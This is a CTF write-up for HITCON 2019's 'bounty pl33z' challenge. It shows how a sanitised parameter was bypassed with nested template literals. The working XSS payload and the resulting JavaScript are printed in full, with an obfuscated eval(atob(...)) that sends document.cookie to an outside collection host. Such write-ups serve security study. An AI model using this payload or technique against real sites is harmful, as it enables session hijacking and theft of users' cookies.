2019 Hitcon CTF quals - bounty pl33z
====================================

https://ctf2019.hitcon.org/

Writeup by Tamás Hegedűs - !SpamAndHex


TL;DR
-----

Submitted an XSS that directly sent the cookie back to us.

```
http://3.114.5.202/fd.php?q=`,"%26%26eval(atob(`Imh0dHBzOi8vcmVxdWVzdGJ1Y2tldC5hcHBzcG90LmNvbS95P2M9IitlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKQ`));(`${`
```


The challenge
-------------

It looks like there is some sso involved in the challenge, they even made me
read `@filedescriptor`s talk about xss+cookiebomb+oauth at
https://speakerdeck.com/filedescriptor/the-cookie-monster-in-your-browsers
.

Then I realized there are no real domains and services so started focusing on
the XSS part.

Certain chars like `'./\` were sanitized. Backticks and a single `"` was
allowed. That was enough to craft a payload that did the leak and resulted in
valid JavaScript. We used nested multiple template literals. The resulting JS
looked something like this after interpolation:

```
if (window.top == window.self) {
    window.self.location.href = "https://`,"&&eval(atob(`Imh0dHBzOi8vcmVxdWVzdGJ1Y2tldC5hcHBzcG90LmNvbS95P2M9IitlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKQ`));(`${`.orange.ctf/oauth/authorize?client_id=1&scope=read&redirect_uri=https://twitter.com/orange_8361";
} else {
    var data = JSON.stringify({
        message: 'CTF.API.remote',
        data: {
            location: "https://`,"&&eval(atob(`Imh0dHBzOi8vcmVxdWVzdGJ1Y2tldC5hcHBzcG90LmNvbS95P2M9IitlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKQ`));(`${`.orange.ctf/oauth/authorize?client_id=1&scope=read&redirect_uri=https://twitter.com/orange_8361"
        }
    });
    window.parent.postMessage(
        data, 
        "https://`,"&&eval(atob(`Imh0dHBzOi8vcmVxdWVzdGJ1Y2tldC5hcHBzcG90LmNvbS95P2M9IitlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuY29va2llKQ`));(`${`.orange.ctf"
    );
}
```

